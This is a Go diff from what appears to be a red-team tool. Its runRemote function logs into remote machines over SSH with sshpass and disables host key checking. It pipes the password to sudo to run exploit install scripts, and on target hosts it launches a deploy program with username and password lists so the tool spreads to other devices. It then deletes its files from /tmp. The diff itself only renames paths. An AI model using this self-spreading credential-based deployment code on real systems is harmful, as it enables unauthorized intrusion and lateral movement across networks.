@@ -80,17 +80,15 @@ func runRemote(username, password, ip string) {
 	cmd := exec.Command("sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", username+"@"+ip)
 	buffer := bytes.Buffer{}
 	//Commands used to deploy exploit on remote system
-	command := "cd /tmp/ls_shim/\n" +
-		"echo " + password + " | sudo -S chmod +x deploy/dependencies.sh\n" +
-		"echo " + password + " | sudo -S ./deploy/dependencies.sh\n" +
-		"echo " + password + " | sudo -S chmod +x install.sh\n" +
-		"echo " + password + " | sudo -S ./install.sh\n"
+	command := "cd /tmp/redteam-scripts/deploy-master/\n" +
+		"echo " + password + " | sudo -S chmod +x install-all.sh\n" +
+		"echo " + password + " | sudo -S ./install-all.sh\n"
 	if isTarget {
 		//If this is a target, add commands to deploy to other devices
 		command += "cd deploy\n" +
-			"echo " + password + " | sudo -S go run deploy.go -i " + GetOutboundIP() + " -m --user-list " + strings.Join(usernames, ",") + " --password-list " + strings.Join(passwords, ",") + "\n"
+			"echo " + password + " | sudo -S go run deploy-master.go -i " + GetOutboundIP() + " -m --user-list " + strings.Join(usernames, ",") + " --password-list " + strings.Join(passwords, ",") + "\n"
 	}
-	command += "echo " + password + " | sudo -S rm -rf /tmp/ls_shim\n"
+	command += "echo " + password + " | sudo -S rm -rf /tmp/redteam-scripts\n"
 	//Write command to buffer
 	buffer.Write([]byte(command))
 	cmd.Stdin = &buffer
